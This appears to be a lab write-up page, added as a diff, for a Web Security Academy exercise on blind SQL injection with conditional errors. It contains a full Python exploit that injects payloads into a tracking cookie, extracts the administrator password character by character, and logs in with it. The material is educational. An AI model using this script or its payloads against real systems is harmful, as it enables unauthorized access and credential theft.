@@ -1,0 +1,128 @@
+---
+title: '12 SQLi Lab'
+description: 'Blind SQL injection exploiting conditional errors to extract administrator password'
+---
+
+import { Aside } from 'astro-pure/user'
+
+## Blind SQL injection with conditional errors
+
+<div style="text-align: justify;">
+  This lab demonstrates a blind SQL injection vulnerability using conditional errors. The application uses a tracking cookie, which is incorporated into SQL queries. The query does not return results directly, but triggers a custom error message when a condition is true (for example, divide-by-zero). By iteratively testing conditions, such as the existence of the `administrator` user or the length and characters of their password, it is possible to extract sensitive data without direct output.
+</div>
+
+<Aside>
+  Start Burp Suite before running the script — it uses a proxy for visibility.
+</Aside>
+
+### How Exploit Works
+- The `TrackingId` cookie is vulnerable to SQL injection.
+- Append a single quote `'` to confirm SQL errors.
+- Use `CASE WHEN` and divide-by-zero to trigger conditional errors.
+- Test the existence of entries, determine password length, and extract each character sequentially.
+- Use Burp Intruder with payloads for `a-z` and `0-9` to automate password extraction.
+- Finally, log in with the extracted administrator credentials to solve the lab.
+
+### Usage
+
+```cmd
+python3 exploit.py https://<your-lab-id>.web-security-academy.net
+```
+
+### Exploit
+
+```python title="exploit.py"
+import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Optional: Route through Burp
+proxies = {"http": "http://127.0.0.1:8080",
+           "https": "http://127.0.0.1:8080"}
+
+# Alphabet to brute force (lowercase + digits as per lab hint)
+CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"
+
+def send_payload(url, tracking_id, session_cookie, payload):
+    """Send request with injected payload, return True if error (500) occurs."""
+    cookies = {
+        "TrackingId": tracking_id + payload,
+        "session": session_cookie
+    }
+    res = requests.get(url, cookies=cookies, verify=False, proxies=proxies, timeout=5)
+    return res.status_code == 500  # 500 means condition is true
+
+def extract_password(url, tracking_id, session_cookie, length=20):
+    """Extract administrator password character by character."""
+    password = ""
+
+    for i in range(1, length + 1):  # Positions start at 1
+        for c in CHARSET:
+            payload = (
+                f"'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{c}' "
+                f"THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+            )
+            if send_payload(url, tracking_id, session_cookie, payload):
+                password += c
+                print(f"[+] Found char {i}: {c} -> {password}")
+                break
+    return password
+
+def login_and_check(url, username, password):
+    """Login with stolen creds and check if lab is solved."""
+    session = requests.Session()
+    login_url = url.rstrip("/") + "/login"
+
+    # Step 1: Fetch CSRF token
+    res = session.get(login_url, verify=False, proxies=proxies)
+    soup = BeautifulSoup(res.text, "html.parser")
+    csrf_token = soup.find("input", {"name": "csrf"})["value"]
+
+    # Step 2: Submit login
+    data = {"csrf": csrf_token, "username": username, "password": password}
+    res = session.post(login_url, data=data, verify=False, proxies=proxies)
+
+    if "Log out" in res.text:
+        print(f"[+] Logged in as {username}. Checking if lab is solved...")
+        base_res = session.get(url, verify=False, proxies=proxies)
+        if "Congratulations" in base_res.text:
+            print("[+] Lab solved! 🎉")
+            return True
+        else:
+            print("[-] Logged in, but lab not solved yet.")
+    else:
+        print("[-] Login failed.")
+    return False
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: python {sys.argv[0]} <url>")
+        sys.exit(1)
+
+    url = sys.argv[1]
+
+    # Step 1: Grab initial cookies
+    r = requests.get(url, verify=False, proxies=proxies)
+    tracking_id = r.cookies.get("TrackingId")
+    session_cookie = r.cookies.get("session")
+
+    if not tracking_id or not session_cookie:
+        print("[-] Failed to retrieve cookies")
+        sys.exit(1)
+
+    print(f"[*] Using TrackingId={tracking_id}, session={session_cookie}")
+
+    # Step 2: Extract password
+    password = extract_password(url, tracking_id, session_cookie, length=20)
+    print(f"[+] Extracted password: {password}")
+
+    # Step 3: Login and check if solved
+    login_and_check(url, "administrator", password)
+
+if __name__ == "__main__":
+    main()
+```
